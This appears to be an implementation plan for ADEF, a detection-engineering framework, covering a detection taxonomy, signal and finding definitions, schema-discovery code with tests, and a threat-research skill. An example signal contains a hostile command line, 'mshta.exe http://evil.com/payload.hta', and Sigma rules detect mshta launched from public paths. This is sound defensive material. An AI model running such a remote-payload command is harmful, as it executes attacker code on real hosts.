# ADEF Meeting Requirements Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Implement the strategic decisions and new features identified in the 2026-06-17 meeting notes to evolve ADEF from its current v0.1.0 state into the opinionated, schema-discovery-first framework described in the meeting.

**Architecture:** This plan builds on the existing ADEF v0.1.0 foundation (FORGE lifecycle, journals, CLI, MCP) and adds: (1) schema discovery as a first-class primitive with pluggable connectors, (2) enhanced detection taxonomy documentation (kind × expression axes), (3) signals/findings definitions, (4) ADEF research skill, (5) interface decisions (CLI vs Skills vs Both), and (6) gray-zone feature planning docs.

**Tech Stack:** Python 3.10+, Click, FastMCP, YAML, Jinja2, existing ADEF plugin architecture

---

## Phase 1: Decision Documentation & Strategic Clarity

### Task 1: Document Interface Decision (Unresolved)

**Files:**
- Create: `docs/decisions/001-interface-shape.md`

**Step 1: Create decision document template**

```markdown
# Decision 001: Interface Shape — CLI vs Skills vs Both

**Status:** UNRESOLVED (Blocking)

**Context:**
ADEF v0.1.0 ships with a CLI-first interface (`adef` commands). The 2026-06-17 meeting identified three options:
1. CLI-first (like ATHF - `adef ...` commands mirroring `athf` ergonomics)
2. Skills-first (Claude Code skills as primary interface, no CLI surface)
3. Both (CLI + skills, with one as primary and the other as escape hatch)

Additionally, there are duplicated/overlapping `athf detect *` commands that need consolidation regardless of which option we choose.

**Decision Needed:**
Which interface shape should ADEF adopt?

**Options:**

### Option A: CLI-first (Current State)
- **Pros:** Familiar to ATHF users, scriptable, CI/CD friendly, works without Claude Code
- **Cons:** Two CLIs to maintain (`adef` + `athf`), potential overlap confusion
- **Consolidation:** Move all detection lifecycle to `adef`, deprecate `athf detect`

### Option B: Skills-first
- **Pros:** Native Claude Code UX, conversational, reduces CLI surface area
- **Cons:** Requires Claude Code, not scriptable, harder to automate
- **Consolidation:** Skills wrap both ATHF and ADEF, CLIs become internal

### Option C: Both (Recommended)
- **Pros:** Best of both worlds, skills for exploration, CLI for automation
- **Cons:** More surface area to maintain, needs clear primary/escape-hatch designation
- **Consolidation:** CLI is primary (automation), skills are convenience layer

**Recommendation:** Option C (Both), with CLI as primary and skills as secondary. Rationale:
- Preserves scriptability and CI/CD workflows
- Adds conversational UX for exploratory work
- Aligns with ATHF's existing pattern (both CLI and MCP)

**Next Steps:**
1. User confirms Option C or provides alternative
2. Document skill-to-CLI mapping in `docs/skills-cli-mapping.md`
3. Consolidate `athf detect` commands into `adef` namespace
```

**Step 2: Write decision document**

Run: `Write` tool with content above

**Step 3: Commit**

```bash
git add docs/decisions/001-interface-shape.md
git commit -m "docs: add interface shape decision document (unresolved)"
```

---

### Task 2: Document Detection Taxonomy (Two Axes)

**Files:**
- Create: `docs/taxonomy.md`
- Modify: `docs/methodology.md` (add cross-reference)

**Step 1: Create taxonomy document**

```markdown
# Detection Taxonomy — Two Orthogonal Axes

ADEF categorizes detections along two independent axes:

## Axis 1: Detection Kind (What It Does)

### Atomic
Single-event pattern matching. One event in → one signal out.

**Example:** "mshta.exe launched from C:\Users\Public\"
- Input: Single `process_create` event
- Logic: Field matching (process_name, parent_path)
- Output: One signal per matching event

**Engines:** Sigma, SQL, Scheduled SQL

### Correlation
Relating multiple events or signals within a time window.

**Example:** "RDP login followed by suspicious PowerShell within 5 minutes from same user"
- Input: Multiple events (authentication + process_create)
- Logic: Temporal correlation, field joins (user, host, timestamp)
- Output: One signal per correlated sequence

**Engines:** SQL (streaming with window functions), Scheduled SQL

### Composite
Combining already-generated signals into higher-order detections.

**Example:** "Host triggered 3+ MITRE T1059 detections in 24h"
- Input: Existing signals from other detections
- Logic: Aggregation over signal metadata (technique ID, host, time)
- Output: One meta-signal per threshold breach

**Engines:** Scheduled SQL (queries signal tables), Composite engine

---

## Axis 2: Expression (How It's Written)

### Sigma
Vendor-neutral YAML-based detection format. Transpiles to SIEM-specific queries.

**Example:**
```yaml
title: Suspicious mshta.exe from Public Directory
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\mshta.exe'
    CurrentDirectory|contains: '\Users\Public\'
  condition: selection
```

**Supported Kinds:** Atomic

### SQL (Streaming)
Real-time SQL over event streams (e.g., Kafka, Kinesis, ClickHouse materialized views).

**Example:**
```sql
SELECT * FROM process_events
WHERE process_name = 'mshta.exe'
  AND parent_path LIKE '%\Users\Public\%'
```

**Supported Kinds:** Atomic, Correlation (with window functions)

### Scheduled SQL (Batch/Temporal)
Periodic SQL queries over historical data.

**Example:**
```sql
SELECT user_id, host, COUNT(*) as technique_count
FROM signals
WHERE technique_id LIKE 'T1059%'
  AND timestamp > NOW() - INTERVAL 24 HOUR
GROUP BY user_id, host
HAVING technique_count >= 3
```

**Supported Kinds:** Atomic (rare), Correlation, Composite

### Engine-Specific
Native formats for specific platforms (KQL for Sentinel, SPL for Splunk, etc.).

**Supported Kinds:** Depends on engine capabilities

---

## The Matrix

|              | Sigma | SQL (Stream) | SQL (Scheduled) | Engine-Specific |
|--------------|-------|--------------|-----------------|-----------------|
| **Atomic**       | ✅     | ✅            | ⚠️ (rare)        | ✅               |
| **Correlation**  | ❌     | ✅            | ✅               | ✅               |
| **Composite**    | ❌     | ❌            | ✅               | ✅               |

**Key Insight:** The two axes are independent. An atomic detection can be expressed in Sigma, SQL, or engine-specific syntax. A correlation can be SQL (streaming or scheduled). Choose the kind first (what behavior you're detecting), then choose the expression (what tooling you have).

---

## Mapping to FORGE

- **Find:** Declare the detection kind and tentative expression
- **Observe:** Confirm the data source supports the chosen expression
- **Refine:** Validate the expression compiles/runs in the target engine
- **Govern:** Ensure deployment pipeline supports the expression type
- **Evolve:** Re-evaluate kind/expression as tooling changes
```

**Step 2: Add cross-reference to methodology.md**

```markdown
## Detection Taxonomy

ADEF categorizes detections along two orthogonal axes: **kind** (atomic, correlation, composite) and **expression** (sigma, SQL, engine-specific). See [`docs/taxonomy.md`](./taxonomy.md) for the full matrix and examples.
```

Insert after the FORGE stages intro in `docs/methodology.md:16`

**Step 3: Commit**

```bash
git add docs/taxonomy.md docs/methodology.md
git commit -m "docs: add detection taxonomy (kind × expression)"
```

---

### Task 3: Define Signals and Findings

**Files:**
- Create: `docs/signals-and-findings.md`
- Modify: `docs/methodology.md` (add reference)

**Step 1: Create signals/findings document**

```markdown
# Signals and Findings

ADEF defines both **signals** and **findings** as first-class artifacts. The distinction matters for lifecycle, ownership, and agent reasoning.

---

## Signals

**Definition:** The direct output of a detection firing.

**Properties:**
- One detection → many signals (over time)
- Generated automatically when detection logic matches
- Fields: `detection_id`, `timestamp`, `severity`, `host`, `user`, `raw_event`, etc.
- Stored in a signal table/index for correlation and composite detections
- Lifecycle: Created → (optionally) Acknowledged → Archived

**Example:**
```yaml
signal_id: SIG-2026-06-25-001234
detection_id: D-0042
detection_name: "Suspicious mshta.exe from Public Directory"
timestamp: 2026-06-25T14:32:11Z
severity: medium
host: DESKTOP-ABC123
user: jdoe
technique_id: T1218.005
raw_event:
  process_name: mshta.exe
  parent_path: C:\Users\Public\temp.bat
  command_line: mshta.exe http://evil.com/payload.hta
```

---

## Findings

**Definition:** The output of triaging, correlating, or aggregating signals.

**Properties:**
- One or more signals → one finding
- Generated by analyst review, correlation detection, or composite detection
- Fields: `finding_id`, `related_signals[]`, `verdict`, `priority`, `assigned_to`, `notes`
- Lifecycle: Opened → Investigating → Resolved (TP/FP/Benign)

**Example:**
```yaml
finding_id: FIND-2026-06-25-042
related_signals:
  - SIG-2026-06-25-001234
  - SIG-2026-06-25-001241
  - SIG-2026-06-25-001255
verdict: true_positive
priority: high
assigned_to: ir-team
summary: "Host DESKTOP-ABC123 showed 3 instances of mshta.exe from Public\ in 10min window, followed by outbound C2 beacon. Confirmed compromise."
actions_taken:
  - Isolated host
  - Collected memory dump
  - Opened incident INC-2026-456
```

---

## The Flow

```
Detection (D-XXXX)
    ↓
Fires when logic matches event
    ↓
Generates Signal (SIG-*)
    ↓
Signal enters triage queue
    ↓
Analyst/Agent reviews signal(s)
    ↓
Creates Finding (FIND-*) if actionable
    ↓
Finding resolved (TP/FP/Benign)
    ↓
Feedback loop: TP/FP rate informs detection tuning (Evolve stage)
```

---

## Why Both?

**Without signals as first-class:**
- Can't measure detection health (volume, FP rate, coverage)
- Composite detections have nowhere to read from
- Tuning decisions (Evolve stage) lack data

**Without findings as first-class:**
- Signals pile up without triage context
- Can't track analyst workload or priority
- No structured input for IR handoff

Both are in scope for ADEF because the full path from detection → signal → finding is the detection-engineering lifecycle.

---

## ADEF Tooling

### Current (v0.1.0)
- Detections are journalled (`D-XXXX.md`)
- Signals and findings are *assumed* to exist in downstream systems (SIEM, SOAR)
- No native signal/finding storage

### Future (v0.2+)
- `adef signal list --detection D-0042` queries downstream signal store
- `adef finding create --from-signals SIG-001,SIG-002` scaffolds finding YAML
- Drift monitoring reads signal volume and FP rate to trigger Evolve recommendations
```

**Step 2: Add reference to methodology.md**

Insert after taxonomy reference:

```markdown
ADEF tracks the full lifecycle from **detection → signal → finding**. See [`docs/signals-and-findings.md`](./signals-and-findings.md) for definitions and the triage flow.
```

**Step 3: Commit**

```bash
git add docs/signals-and-findings.md docs/methodology.md
git commit -m "docs: define signals and findings as first-class"
```

---

## Phase 2: Schema Discovery — First-Class Primitive

### Task 4: Design Schema Discovery Architecture

**Files:**
- Create: `docs/schema-discovery.md`
- Create: `adef/schema/__init__.py`
- Create: `adef/schema/base.py` (abstract connector interface)

**Step 1: Write schema discovery doc**

```markdown
# Schema Discovery — First-Class Primitive

**The Doctrine:** Before writing a single query, ADEF figures out what the data looks like.

---

## Why Schema Discovery?

Detection rules that assume fields exist (`parent_process_path`, `user.name`, `src_ip`) fail silently when:
- The field is renamed (`ParentImage` in Sysmon, `parent.executable` in Elastic)
- The field is unpopulated (40% of events missing `command_line`)
- The data source doesn't exist (no EDR, only firewall logs)

Schema discovery makes the data shape **explicit and queryable** before rule authoring.

---

## What ADEF Ships

**ADEF ships the HOW (discovery method), not the WHAT (vendor schemas).**

Maintaining a per-vendor catalog of field schemas (Splunk CIM, Elastic ECS, Microsoft Sentinel, CrowdStrike, SentinelOne, etc.) is:
- A maintenance burden that scales badly
- Fast-aging (vendors rename fields quarterly)
- Policy-coupled (requires API keys, auth, network access)

Instead, ADEF provides:
1. **Abstract connector interface** (`SchemaConnector` base class)
2. **Discovery orchestration** (`adef schema discover --connector <name>`)
3. **Persistence layer** (schemas stored in workspace as `config/schemas/<source>.yaml`)
4. **Reference implementations** (generic SQL, generic REST API)

Users implement connectors for their environment and register them as plugins.

---

## Schema Discovery Flow

```
User runs: adef schema discover --connector splunk

1. ADEF loads SplunkConnector (user-provided plugin)
2. Connector queries Splunk API: "show me fields for sourcetype=WinEventLog:Security"
3. Connector reverse-engineers schema:
   - Field names, types, cardinality
   - Population rate (% of events with non-null values)
   - Sample values (for enum-like fields)
4. ADEF persists schema to workspace: config/schemas/splunk-security.yaml
5. Subsequent rule authoring references schema:
   - "Does parent_process_path exist in splunk-security?"
   - "What's the field population rate for command_line?"
   - "Show sample values for process_name (top 20)"
```

---

## Schema File Format

```yaml
# config/schemas/splunk-security.yaml
source: splunk
sourcetype: WinEventLog:Security
discovered_at: 2026-06-25T10:30:00Z
event_count_sampled: 1000000
time_window: 30d

fields:
  - name: EventCode
    type: integer
    population_rate: 1.0
    cardinality: high
    sample_values: [4624, 4625, 4688, 4689, 4720]

  - name: ParentImage
    type: string
    population_rate: 0.92
    cardinality: medium
    sample_values:
      - C:\Windows\System32\services.exe
      - C:\Windows\explorer.exe
      - C:\Windows\System32\svchost.exe

  - name: CommandLine
    type: string
    population_rate: 0.68
    cardinality: high
    notes: "Unreliable before 2024-03; disabled by GPO on legacy hosts"
```

---

## Connector Interface

```python
# adef/schema/base.py
from abc import ABC, abstractmethod
from typing import Dict, Any

class SchemaConnector(ABC):
    """Abstract base for schema discovery connectors."""

    @abstractmethod
    def discover(self, source: str, **kwargs) -> Dict[str, Any]:
        """
        Query the data source and return schema as dict.

        Args:
            source: Identifier for the data source (e.g., "splunk-security")
            **kwargs: Connector-specific params (time_window, sample_size, etc.)

        Returns:
            Schema dict matching the YAML format above
        """
        pass

    @abstractmethod
    def validate_query(self, query: str, schema: Dict[str, Any]) -> bool:
        """
        Check if a query references fields that exist in the schema.

        Args:
            query: Rule query (Sigma, SQL, etc.)
            schema: Schema dict from discover()

        Returns:
            True if all referenced fields exist with adequate population rate
        """
        pass
```

---

## Plugin Registration

Users implement connectors as plugins:

```toml
# Third-party plugin: adef-splunk-connector
[project.entry-points."adef.schema_connectors"]
splunk = "adef_splunk.connector:SplunkConnector"
```

ADEF discovers and loads connectors via the plugin system (same pattern as commands/agents/mcp_tools).

---

## Integration with FORGE

- **Find:** No schema needed yet (hypothesis only)
- **Observe:** Run `adef schema discover` to characterize data source fields
- **Refine:** Validate rule queries against discovered schema
- **Govern:** Schema validation becomes deployment gate
- **Evolve:** Re-run discovery periodically to detect schema drift

---

## Gray Zone: Auto-Refresh

**Open question (defer to product):** Should ADEF auto-refresh schemas on a schedule?

- **Framework:** Ships one-shot discovery command
- **Product:** Adds scheduled re-discovery, drift alerts, auto-tuning proposals
```

**Step 2: Create schema module structure**

```python
# adef/schema/__init__.py
"""Schema discovery for ADEF — first-class primitive."""

from adef.schema.base import SchemaConnector

__all__ = ["SchemaConnector"]
```

**Step 3: Create abstract base class**

```python
# adef/schema/base.py
"""Abstract base class for schema discovery connectors."""

from abc import ABC, abstractmethod
from typing import Dict, Any, List


class SchemaConnector(ABC):
    """
    Abstract base for schema discovery connectors.

    Subclasses implement vendor-specific logic to query data sources
    and reverse-engineer field schemas. ADEF orchestrates discovery,
    persistence, and validation via this interface.
    """

    @abstractmethod
    def discover(self, source: str, **kwargs) -> Dict[str, Any]:
        """
        Query the data source and return schema as dict.

        Args:
            source: Identifier for the data source (e.g., "splunk-security")
            **kwargs: Connector-specific params (time_window, sample_size, etc.)

        Returns:
            Schema dict with keys: source, discovered_at, event_count_sampled,
            time_window, fields (list of dicts with name, type, population_rate,
            cardinality, sample_values).

        Example:
            {
                "source": "splunk-security",
                "sourcetype": "WinEventLog:Security",
                "discovered_at": "2026-06-25T10:30:00Z",
                "event_count_sampled": 1000000,
                "time_window": "30d",
                "fields": [
                    {
                        "name": "EventCode",
                        "type": "integer",
                        "population_rate": 1.0,
                        "cardinality": "high",
                        "sample_values": [4624, 4625, 4688]
                    }
                ]
            }
        """
        pass

    @abstractmethod
    def validate_query(self, query: str, schema: Dict[str, Any]) -> Dict[str, Any]:
        """
        Check if a query references fields that exist in the schema.

        Args:
            query: Rule query (Sigma, SQL, KQL, etc.)
            schema: Schema dict from discover()

        Returns:
            Validation result dict with keys:
                - valid (bool): True if all fields exist with adequate population
                - missing_fields (List[str]): Fields referenced but not in schema
                - low_population_fields (List[str]): Fields with <50% population rate
                - warnings (List[str]): Human-readable warnings

        Example:
            {
                "valid": False,
                "missing_fields": ["parent_process_path"],
                "low_population_fields": ["command_line"],
                "warnings": [
                    "Field 'parent_process_path' not found in schema",
                    "Field 'command_line' has 68% population rate (may miss events)"
                ]
            }
        """
        pass
```

**Step 4: Commit**

```bash
git add docs/schema-discovery.md adef/schema/__init__.py adef/schema/base.py
git commit -m "feat: add schema discovery architecture and base connector"
```

---

### Task 5: Add Schema Discovery CLI Command

**Files:**
- Create: `adef/commands/schema.py`
- Modify: `pyproject.toml` (register command)
- Create: `adef/core/schema_manager.py` (persistence layer)

**Step 1: Write test for schema manager**

```python
# tests/test_schema_manager.py
"""Tests for schema persistence and management."""

import pytest
from pathlib import Path
from adef.core.schema_manager import SchemaManager


def test_save_schema(tmp_path):
    """Schema manager saves schemas to workspace config dir."""
    manager = SchemaManager(workspace_path=tmp_path)
    
    schema = {
        "source": "test-source",
        "discovered_at": "2026-06-25T10:00:00Z",
        "fields": [
            {"name": "field1", "type": "string", "population_rate": 1.0}
        ]
    }
    
    manager.save_schema("test-source", schema)
    
    schema_file = tmp_path / "config" / "schemas" / "test-source.yaml"
    assert schema_file.exists()
    assert "field1" in schema_file.read_text()


def test_load_schema(tmp_path):
    """Schema manager loads previously saved schemas."""
    manager = SchemaManager(workspace_path=tmp_path)
    
    schema = {"source": "test", "fields": []}
    manager.save_schema("test", schema)
    
    loaded = manager.load_schema("test")
    assert loaded["source"] == "test"
    assert "fields" in loaded


def test_list_schemas(tmp_path):
    """Schema manager lists all discovered schemas."""
    manager = SchemaManager(workspace_path=tmp_path)
    
    manager.save_schema("source1", {"source": "source1", "fields": []})
    manager.save_schema("source2", {"source": "source2", "fields": []})
    
    schemas = manager.list_schemas()
    assert len(schemas) == 2
    assert "source1" in schemas
    assert "source2" in schemas
```

**Step 2: Run test (should fail)**

```bash
pytest tests/test_schema_manager.py -v
```

Expected: FAIL (module not found)

**Step 3: Implement schema manager**

```python
# adef/core/schema_manager.py
"""Schema persistence and management."""

from __future__ import annotations

import os
import yaml
from pathlib import Path
from typing import Dict, Any, List
from datetime import datetime


class SchemaManager:
    """
    Manages schema discovery persistence in the ADEF workspace.

    Schemas are stored as YAML files in config/schemas/ directory.
    """

    def __init__(self, workspace_path: str | Path | None = None):
        """
        Initialize schema manager.

        Args:
            workspace_path: Path to ADEF workspace. Defaults to ADEF_WORKSPACE env var
                            or ~/work/adef-workspace/
        """
        if workspace_path is None:
            workspace_path = os.getenv("ADEF_WORKSPACE", "~/work/adef-workspace")
        
        self.workspace_path = Path(workspace_path).expanduser()
        self.schemas_dir = self.workspace_path / "config" / "schemas"
        self.schemas_dir.mkdir(parents=True, exist_ok=True)

    def save_schema(self, source: str, schema: Dict[str, Any]) -> Path:
        """
        Save schema to workspace.

        Args:
            source: Schema source identifier (becomes filename)
            schema: Schema dict (will be serialized as YAML)

        Returns:
            Path to saved schema file
        """
        schema_file = self.schemas_dir / f"{source}.yaml"
        
        # Add metadata
        if "discovered_at" not in schema:
            schema["discovered_at"] = datetime.utcnow().isoformat() + "Z"
        
        with open(schema_file, "w") as f:
            yaml.safe_dump(schema, f, default_flow_style=False, sort_keys=False)
        
        return schema_file

    def load_schema(self, source: str) -> Dict[str, Any]:
        """
        Load schema from workspace.

        Args:
            source: Schema source identifier

        Returns:
            Schema dict

        Raises:
            FileNotFoundError: If schema doesn't exist
        """
        schema_file = self.schemas_dir / f"{source}.yaml"
        
        if not schema_file.exists():
            raise FileNotFoundError(f"Schema not found: {source}")
        
        with open(schema_file, "r") as f:
            return yaml.safe_load(f)

    def list_schemas(self) -> List[str]:
        """
        List all discovered schemas in workspace.

        Returns:
            List of schema source identifiers
        """
        if not self.schemas_dir.exists():
            return []
        
        return [
            f.stem for f in self.schemas_dir.glob("*.yaml")
        ]

    def delete_schema(self, source: str) -> None:
        """
        Delete a schema from workspace.

        Args:
            source: Schema source identifier
        """
        schema_file = self.schemas_dir / f"{source}.yaml"
        if schema_file.exists():
            schema_file.unlink()
```

**Step 4: Run test (should pass)**

```bash
pytest tests/test_schema_manager.py -v
```

Expected: PASS

**Step 5: Write schema CLI command**

```python
# adef/commands/schema.py
"""Schema discovery CLI commands."""

import click
from rich.console import Console
from rich.table import Table

from adef.core.schema_manager import SchemaManager
from adef.plugin_system import PluginRegistry

console = Console()


@click.group()
def schema() -> None:
    """Schema discovery and management commands."""


@schema.command()
@click.option("--connector", required=True, help="Connector plugin name")
@click.option("--source", required=True, help="Data source identifier")
@click.option("--time-window", default="30d", help="Time window for sampling (default: 30d)")
@click.option("--sample-size", default=1000000, type=int, help="Number of events to sample")
def discover(connector: str, source: str, time_window: str, sample_size: int) -> None:
    """
    Discover schema from a data source using a connector plugin.

    Example:
        adef schema discover --connector splunk --source security-logs
    """
    # Load connector plugin
    connectors = PluginRegistry.load_schema_connectors()
    
    if connector not in connectors:
        console.print(f"[red]Error:[/red] Connector '{connector}' not found")
        console.print("\nAvailable connectors:")
        for name in connectors.keys():
            console.print(f"  • {name}")
        raise click.Abort()
    
    connector_class = connectors[connector]
    connector_instance = connector_class()
    
    console.print(f"[blue]Discovering schema for '{source}' using '{connector}' connector...[/blue]")
    
    # Run discovery
    schema = connector_instance.discover(
        source=source,
        time_window=time_window,
        sample_size=sample_size
    )
    
    # Save to workspace
    manager = SchemaManager()
    schema_file = manager.save_schema(source, schema)
    
    console.print(f"[green]✓[/green] Schema saved to: {schema_file}")
    console.print(f"\nDiscovered {len(schema.get('fields', []))} fields")


@schema.command()
def list() -> None:
    """List all discovered schemas in workspace."""
    manager = SchemaManager()
    schemas = manager.list_schemas()
    
    if not schemas:
        console.print("[yellow]No schemas found. Run 'adef schema discover' first.[/yellow]")
        return
    
    table = Table(title="Discovered Schemas")
    table.add_column("Source", style="cyan")
    table.add_column("Discovered At", style="green")
    table.add_column("Fields", justify="right")
    
    for source in schemas:
        schema = manager.load_schema(source)
        table.add_row(
            source,
            schema.get("discovered_at", "unknown"),
            str(len(schema.get("fields", [])))
        )
    
    console.print(table)


@schema.command()
@click.argument("source")
def show(source: str) -> None:
    """Show details of a discovered schema."""
    manager = SchemaManager()
    
    try:
        schema = manager.load_schema(source)
    except FileNotFoundError:
        console.print(f"[red]Error:[/red] Schema '{source}' not found")
        console.print("\nRun 'adef schema list' to see available schemas")
        raise click.Abort()
    
    console.print(f"[bold]Schema: {source}[/bold]\n")
    console.print(f"Discovered: {schema.get('discovered_at')}")
    console.print(f"Time window: {schema.get('time_window')}")
    console.print(f"Events sampled: {schema.get('event_count_sampled')}\n")
    
    table = Table(title="Fields")
    table.add_column("Name", style="cyan")
    table.add_column("Type")
    table.add_column("Population %", justify="right")
    table.add_column("Cardinality")
    
    for field in schema.get("fields", []):
        pop_rate = field.get("population_rate", 0) * 100
        table.add_row(
            field["name"],
            field.get("type", "unknown"),
            f"{pop_rate:.0f}%",
            field.get("cardinality", "unknown")
        )
    
    console.print(table)


@schema.command()
@click.argument("source")
@click.confirmation_option(prompt="Are you sure you want to delete this schema?")
def delete(source: str) -> None:
    """Delete a discovered schema."""
    manager = SchemaManager()
    manager.delete_schema(source)
    console.print(f"[green]✓[/green] Schema '{source}' deleted")
```

**Step 6: Register schema command in pyproject.toml**

Add to `[project.entry-points."adef.commands"]`:
```toml
schema = "adef.commands.schema:schema"
```

**Step 7: Add schema connector plugin group to plugin_system.py**

```python
# In adef/plugin_system.py, add to PluginRegistry class:

@staticmethod
def load_schema_connectors() -> Dict[str, type]:
    """Load schema connector plugins from entry points."""
    connectors = {}
    
    for entry_point in metadata.entry_points().get("adef.schema_connectors", []):
        try:
            connector_class = entry_point.load()
            connectors[entry_point.name] = connector_class
        except Exception as e:
            console.print(
                f"[yellow]Warning:[/yellow] Failed to load schema connector "
                f"'{entry_point.name}': {e}",
                file=sys.stderr
            )
    
    return connectors
```

**Step 8: Update pyproject.toml to add schema_connectors entry point group**

Add after `[project.entry-points."adef.mcp_tools"]`:
```toml
[project.entry-points."adef.schema_connectors"]
# Third-party schema connector plugins register here
```

**Step 9: Commit**

```bash
git add tests/test_schema_manager.py adef/core/schema_manager.py adef/commands/schema.py adef/plugin_system.py pyproject.toml
git commit -m "feat: add schema discovery CLI and persistence layer"
```

---

## Phase 3: ADEF Research Skill

### Task 6: Create ADEF Research Skill

**Files:**
- Create: `skills/adef-research.md` (if using local skills dir)
- Or coordinate with superpowers marketplace for publication

**Step 1: Write research skill document**

```markdown
---
name: adef-research
description: Research CTI, vulnerabilities, and threat intel to inform detection engineering — parallel to ATHF research but optimized for detection authoring
---

# ADEF Research Skill

Use this skill when researching threat intelligence, vulnerability reports, or adversary TTPs **for the purpose of creating or improving detections**.

**IMPORTANT:** This is distinct from ATHF research (which finds hunt hypotheses). ADEF research produces:
- Detection rule drafts (not hunt plans)
- Field-level telemetry mappings (not exploration queries)
- Coverage gap analysis against existing detections (not hunt backlog)

---

## When to Use

Invoke this skill when:
- User provides a CTI URL and wants detection rules extracted
- User asks "what detections should we add for [threat/CVE/technique]?"
- User requests coverage analysis: "do we detect [specific TTP]?"
- User wants to map threat intel to MITRE ATT&CK and suggest detections

**Do NOT use for:**
- Threat hunting hypothesis generation (use ATHF research)
- Detection tuning/deprecation (use ADEF Evolve stage tools)
- Schema discovery (use `adef schema discover`)

---

## Research Flow

### Step 1: Ingest Source Material

Accept one of:
- **CTI URL:** Threat report from vendor, blog post, advisory
- **CVE ID:** Vulnerability identifier (e.g., CVE-2024-1234)
- **MITRE Technique:** ATT&CK technique or sub-technique ID
- **Adversary Name:** APT group or threat actor

Fetch and parse the source material. Extract:
- TTPs (techniques, tactics, procedures)
- Indicators (hashes, IPs, domains, file paths, process names)
- Behaviors (sequences of actions, not just atomic indicators)

### Step 2: Map to MITRE ATT&CK

For each extracted TTP, identify:
- Primary technique ID (e.g., T1059.001 - PowerShell)
- Tactic (e.g., Execution, Persistence, Defense Evasion)
- Detection opportunities (what telemetry would reveal this?)

**Output:** MITRE technique mapping table

### Step 3: Check Existing Coverage

Query the ADEF workspace for existing detections:
```bash
adef detection list --technique T1059.001
```

Or use MCP tools if available:
- `mcp__security-detections__list_by_mitre`
- `mcp__security-detections__analyze_coverage`

**Output:** Coverage gap list (techniques from CTI not covered by existing detections)

### Step 4: Draft Detection Rules

For each coverage gap:

1. **Find stage draft:** Write hypothesis in markdown
2. **Observe stage guidance:** Identify required data sources and fields
3. **Refine stage starter:** Draft Sigma or SQL rule (user specifies preference)

**Template:**
```markdown
## Detection Draft: [Behavior Name]

**MITRE Technique:** T1234.567
**Hypothesis:** [One sentence - what behavior does this detect?]

### Observe (Data Requirements)
- Data source: [Windows Event Logs / EDR / Network / etc.]
- Required fields: [process_name, parent_process_path, command_line, ...]
- Expected volume: [estimate based on baseline]

### Refine (Rule Draft)
```yaml
title: [Descriptive detection name]
detection:
  selection:
    [field]: [pattern]
  condition: selection
```
```

**Step 5: Prioritize by Risk**

Rank detection drafts by:
- MITRE tactic criticality (Execution, Persistence, Lateral Movement rank high)
- Prevalence in recent threat intel (trending TTPs)
- Coverage gap severity (zero existing coverage vs. partial)

**Output:** Ordered list of detection drafts with priority scores

---

## Output Format

Produce a structured markdown report:

```markdown
# ADEF Research Report: [Source Name]

**Source:** [URL or identifier]
**Researched:** [timestamp]
**Coverage Gaps Found:** [count]

---

## Summary

[2-3 sentences: what was researched, key findings]

---

## MITRE ATT&CK Mapping

| Technique | Tactic | Behavior | Existing Coverage |
|-----------|--------|----------|-------------------|
| T1059.001 | Execution | PowerShell execution from suspicious path | ⚠️ Partial |
| T1218.005 | Defense Evasion | mshta.exe proxy execution | ❌ None |

---

## Detection Drafts (Priority Order)

### 1. [HIGH] Mshta.exe from Public Directory

**MITRE:** T1218.005 (Defense Evasion)
**Hypothesis:** Mshta.exe launched from writable public paths is rare in benign telemetry.

**Observe:**
- Data source: Windows Event ID 4688 (Process Creation) or Sysmon Event ID 1
- Required fields: `process_name`, `parent_process_path`, `current_directory`
- Expected volume: <5 events/day in baseline environments

**Refine (Sigma):**
```yaml
title: Suspicious mshta.exe from Public Directory
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\mshta.exe'
    CurrentDirectory|contains:
      - '\Users\Public\'
      - '\ProgramData\'
  condition: selection
level: medium
```

**Next Steps:**
1. Create detection journal: `adef detection new "Suspicious mshta.exe from Public Directory"`
2. Copy Observe and Refine notes into journal
3. Advance to Observe stage: `adef detection observe D-XXXX`
4. Validate against real data, then advance to Refine

---

### 2. [MEDIUM] PowerShell Web Download

[Repeat template for next detection...]

---

## Existing Detections to Review

The following existing detections may need tuning based on this research:
- D-0042: "PowerShell Base64 Encoded Command" — consider adding mshta.exe parent exclusion

---

## References

- [Original CTI source URL]
- [MITRE ATT&CK technique pages]
- [Related vendor advisories]
```

---

## Usage Examples

### Example 1: Research from CTI URL

```
User: Research this Mandiant report for new detections: https://example.com/fin7-report

Skill: [Fetches report, extracts TTPs, maps to ATT&CK, checks existing coverage, drafts 3 detections]

Output: Markdown report with ranked detection drafts ready to create via `adef detection new`
```

### Example 2: Coverage gap analysis

```
User: Do we have detections for CVE-2024-1234?

Skill: [Looks up CVE, identifies affected software, maps exploitation TTPs to ATT&CK, queries existing coverage]

Output: Coverage assessment + draft detection if gap exists
```

### Example 3: Technique-specific research

```
User: What detections should we add for T1053.005 (Scheduled Task)?

Skill: [Reads MITRE page, identifies sub-techniques, checks existing coverage, suggests 2-3 detection variations]

Output: Detection drafts for different scheduled task abuse patterns
```

---

## Integration with ADEF CLI

After producing detection drafts, guide user to:

```bash
# Create detection from research output
adef detection new "Suspicious mshta.exe from Public Directory"

# Paste Observe/Refine notes from research report into journal

# Advance through FORGE
adef detection observe D-XXXX
adef detection refine D-XXXX
```

---

## Skill Metadata

```yaml
triggers:
  - "research [CTI/CVE/technique] for detections"
  - "what detections for [threat/adversary]"
  - "coverage gap analysis"
  - "extract detections from [URL]"

outputs:
  - MITRE ATT&CK mapping table
  - Coverage gap list
  - Prioritized detection drafts (Find + Observe + Refine starters)
  - Markdown report

related_skills:
  - athf-research (for hunt hypotheses, not detections)
  - adef-tune (for improving existing detections)
  - adef-evolve (for deprecation decisions)
```
```

**Step 2: Test skill manually**

Provide skill to Claude Code and test with:
```
User: Research this blog post for detections: [paste CTI URL]
```

Verify output matches template structure.

**Step 3: Document skill in ADEF docs**

Create reference in `docs/skills.md`:

```markdown
# ADEF Skills for Claude Code

ADEF provides specialized skills for detection engineering workflows in Claude Code, Cursor, and other AI IDEs.

## adef-research

Research threat intelligence, CVEs, and adversary TTPs to inform detection engineering.

**When to use:** User provides CTI source and wants detection rules extracted.

**Output:** Markdown report with MITRE mapping, coverage gaps, and prioritized detection drafts.

**Example:**
```
User: Research this Mandiant FIN7 report for new detections: https://...
```

**Related:**
- `athf-research` — for hunt hypotheses (different output format)
- ADEF Refine stage — validates and tests detection drafts
```

